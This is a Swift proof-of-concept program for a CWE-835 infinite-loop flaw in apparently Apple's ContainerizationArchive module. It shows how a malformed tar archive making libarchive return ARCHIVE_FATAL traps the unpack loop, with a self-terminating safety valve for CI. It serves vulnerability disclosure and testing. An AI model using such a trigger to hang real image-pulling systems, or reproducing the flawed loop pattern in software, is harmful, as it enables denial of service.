// RealArchiveFatalPoC — CWE-835 (Loop with Unreachable Exit Condition)
// Demonstrates the infinite loop via the REAL ContainerizationArchive module.
//
// This PoC directly imports ContainerizationArchive (path dependency on the parent
// apple/containerization repo) and calls the exact same API as:
//
//   EXT4.Formatter.unpackEntries()     — Formatter+Unpack.swift:111
//   EXT4.Formatter.scanArchiveHeaders()— Formatter+Unpack.swift:91
//   ArchiveReader.extractContents()    — ArchiveReader.swift:287
//
// Root cause (ArchiveReader.swift:221-229, StreamingIterator.next()):
//
//   public mutating func next() -> (WriteEntry, ArchiveEntryReader)? {
//       let entry = WriteEntry()
//       let result = archive_read_next_header2(reader.underlying, entry.underlying)
//       if result == ARCHIVE_EOF { return nil }   // ← ONLY exit condition
//       // ARCHIVE_FATAL falls through — returns non-nil with nil entry.path
//       let streamReader = ArchiveEntryReader(reader: reader)
//       return (entry, streamReader)
//   }
//
// When libarchive returns ARCHIVE_FATAL (-30) on a malformed archive:
//   • result (-30) != ARCHIVE_EOF (1) → non-nil returned
//   • entry.path == nil (no header populated)
//   • Caller loop: guard entry.path != nil else { continue } → continue
//   • Loop re-enters → ARCHIVE_FATAL again → infinite loop (CWE-835)

import ContainerizationArchive  // THE REAL MODULE — no @_silgen_name, no replica
import Foundation

// libarchive constants (archive.h):
//   ARCHIVE_EOF   = 1
//   ARCHIVE_OK    = 0
//   ARCHIVE_RETRY = -10
//   ARCHIVE_WARN  = -20
//   ARCHIVE_FAILED = -25  (current operation cannot continue)
//   ARCHIVE_FATAL  = -30  (library cannot continue)
let ARCHIVE_EOF_VAL:    Int32 = 1
let ARCHIVE_OK_VAL:     Int32 = 0
let ARCHIVE_FAILED_VAL: Int32 = -25
let ARCHIVE_FATAL_VAL:  Int32 = -30

// ──────────────────────────────────────────────────────────────────────────
// Reachability: the loop under test is reached via EXT4Unpacker.unpack()
// which is the standard `cctl pull` code path. That path calls:
//   EXT4.Formatter.unpack(source:format:compression:) [Formatter+Unpack.swift:33]
//   → (optional) scanArchiveHeaders()                 [Formatter+Unpack.swift:83]
//   → unpackEntries(reader:)                          [Formatter+Unpack.swift:102]
//      for (entry, _) in reader.makeStreamingIterator() { ... }
//
// This PoC exercises makeStreamingIterator() directly on a real ArchiveReader,
// replicating the callers' loop pattern verbatim. The iterator returns the same
// (WriteEntry, ArchiveEntryReader) tuple that unpackEntries / scanArchiveHeaders
// consume — so the loop behavior is identical.
// ──────────────────────────────────────────────────────────────────────────

let archivePath = CommandLine.arguments.count > 1
    ? CommandLine.arguments[1]
    : "/tmp/malformed_layer.tar"

print("=== SIG-01 Real PoC — CWE-835 via ContainerizationArchive ===")
print("Archive path : \(archivePath)")
print("ContainerizationArchive: REAL module (path dependency on apple/containerization)")
print()
print("libarchive constants:")
print("  ARCHIVE_EOF    =  \(ARCHIVE_EOF_VAL)  (loop exits here — never reached on FATAL)")
print("  ARCHIVE_OK     =  \(ARCHIVE_OK_VAL)  (header parsed OK)")
print("  ARCHIVE_FAILED = \(ARCHIVE_FAILED_VAL)  (operation failed; library may continue)")
print("  ARCHIVE_FATAL  = \(ARCHIVE_FATAL_VAL)  (library cannot continue — triggers the bug)")
print()

// Open the archive using the real ContainerizationArchive API.
// Format.paxRestricted + Filter.none matches EXT4Unpacker.unpack(archive:compression:at:)
// when called with compression .none, and matches EXT4.Formatter.unpack(source:format:compression:).
let fileURL = URL(fileURLWithPath: archivePath)
let reader: ArchiveReader
do {
    reader = try ArchiveReader(format: .paxRestricted, filter: .none, file: fileURL)
    print("ArchiveReader initialized successfully (archive_read_open_fd → ARCHIVE_OK)")
} catch {
    print("FAIL: ArchiveReader init threw: \(error)")
    print("(Check that the malformed tar exists at \(archivePath))")
    exit(1)
}

print()
print("Entering for-in loop over reader.makeStreamingIterator()")
print("— this mirrors EXT4.Formatter.unpackEntries() at Formatter+Unpack.swift:111")
print("— and EXT4.Formatter.scanArchiveHeaders() at Formatter+Unpack.swift:91")
print()
print("If the process hangs → CWE-835 ARCHIVE_FATAL loop confirmed on REAL code path.")
print()

var iteration = 0
let startTime = Date()

for (entry, _) in reader.makeStreamingIterator() {
    // This is the EXACT loop body from unpackEntries():
    //   guard var pathEntry = entry.path else { continue }
    iteration += 1
    let elapsed = Date().timeIntervalSince(startTime)
    let path = entry.path

    print(String(format: "Iter %4d | t=%.3fs | entry.path = %@",
                 iteration, elapsed, path ?? "nil (ARCHIVE_FATAL → nil → continue → loops forever)"))

    guard path != nil else {
        // Mirrors the guard in unpackEntries() and scanArchiveHeaders().
        // On ARCHIVE_FATAL the iterator returns a non-nil tuple but entry.path is nil,
        // so this guard fires and the loop body continues — forever.
        if iteration >= 50 {
            // Safety valve: terminate after 50 confirmed ARCHIVE_FATAL iterations
            // so CI does not hang. In real cctl, no such valve exists.
            print()
            print("CONFIRMED: \(iteration) iterations without ARCHIVE_EOF")
            print("loop_status: INFINITE — process would hang indefinitely in production")
            print("(Safety valve: PoC self-terminates at 50 iterations to avoid CI hang)")
            break
        }
        continue  // ← same continue as in unpackEntries()
    }

    print("→ valid path: \(path!) — this is the non-malformed control case")
}

let elapsed = Date().timeIntervalSince(startTime)
print()
print("=== PoC complete ===")
print("Total iterations : \(iteration)")
print("Elapsed          : \(String(format: "%.3f", elapsed))s")
if iteration >= 50 {
    print("Result           : CONFIRMED — ARCHIVE_FATAL infinite loop (CWE-835)")
    print("Affected sites   : Formatter+Unpack.swift:111 (unpackEntries),")
    print("                   Formatter+Unpack.swift:91 (scanArchiveHeaders),")
    print("                   ArchiveReader.swift:319 (extractFile),")
    print("                   ArchiveReader.swift:287 (extractContents)")
} else if iteration == 0 {
    print("Result           : No iterations — archive opened but returned ARCHIVE_EOF immediately")
    print("                   (unexpected for malformed archive; check the tar generator)")
} else {
    print("Result           : \(iteration) iterations — check ARCHIVE_FATAL vs ARCHIVE_FAILED")
}
